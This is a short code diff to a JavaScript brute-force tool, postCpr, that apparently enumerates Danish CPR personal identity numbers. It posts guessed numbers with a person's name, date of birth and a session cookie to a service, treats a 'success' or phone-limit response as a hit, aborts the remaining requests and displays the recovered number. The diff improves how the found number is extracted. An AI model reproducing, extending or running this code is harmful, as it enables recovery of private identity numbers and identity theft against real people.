@@ -80,7 +80,7 @@ function postCpr(cpr){
 			$('#running').html(countRunning);
 
 			possibilities.push ( cpr );
-			console.log(cpr);
+
 			xhr[countRunning] = $.post('post.php', {'cpr': cpr, 'dob':dob, 'firstName': firstName, 'lastName': lastName, 'cookie':cookie}, function(response){
 			
 				// count completed requests
@@ -88,8 +88,7 @@ function postCpr(cpr){
 				$('#completed').html(countCompleted);	
 				
 				// we found the correct number
-				if(response.indexOf("success") != -1 || response.indexOf("dit maximale antal af mobiltelefoner") != -1){
-				
+				if(response.indexOf("success") != -1 || response.indexOf("dit maximale antal af mobiltelefoner") != -1){				
 					// abort all requests
 					$.each(xhr, function(key, object) { 
 						if(object != undefined){
@@ -97,10 +96,11 @@ function postCpr(cpr){
 							console.log(key + " aborted");
 						}
 					});
-
-					$("#correctCpr").html(response);
+					
+					// output correct cpr
+					var cprnummer = /cpr=(\d+)&/g.exec(this.data);
+					$("#correctCpr").html(cprnummer[1]);
 				}
-				
 			});
 	}
 }
